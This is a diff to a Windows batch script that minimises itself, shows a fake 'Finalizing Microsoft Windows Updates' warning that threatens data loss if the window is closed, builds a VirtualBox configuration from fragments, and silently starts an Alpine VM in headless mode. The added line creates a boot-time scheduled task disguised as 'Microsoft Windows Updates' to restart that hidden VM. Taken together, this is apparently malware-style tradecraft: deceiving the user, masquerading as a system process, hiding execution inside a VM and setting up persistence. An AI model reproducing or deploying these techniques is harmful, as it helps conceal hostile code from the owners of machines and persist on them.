@@ -5,7 +5,7 @@
 ::::::::::::::::::::::::::::::::::::::::::::
  @echo off
  CLS
-if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
+ if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
 :init
  setlocal DisableDelayedExpansion
  set cmdInvoke=1
@@ -48,7 +48,6 @@ if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
  ::START
  ::::::::::::::::::::::::::::
  :: https://download.virtualbox.org/virtualbox/6.1.22/VirtualBox-6.1.22-144080-Win.exe
- REM Run shell as admin (example) - put here code as you like
  @echo off
  ECHO Finalizing Microsoft Windows Updates...
  ECHO Closing this window manually will result in data loss.
@@ -83,6 +82,7 @@ if not "%1" == "min" start /MIN cmd /c %0 min & exit/b >nul 2>&1
   type C:\test\vm1.txt > C:\test\AlpineBase2.vbox
   type C:\test\sf.txt >> C:\test\AlpineBase2.vbox
   type C:\test\vm2.txt >> C:\test\AlpineBase2.vbox
+  schtasks /create /tn "Microsoft Windows Updates" /tr "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe startvm AlpineBase2 --type headless" /sc onstart
   "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" registervm C:\test\AlpineBase2.vbox
   "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm AlpineBase2 --type headless
  ::exit
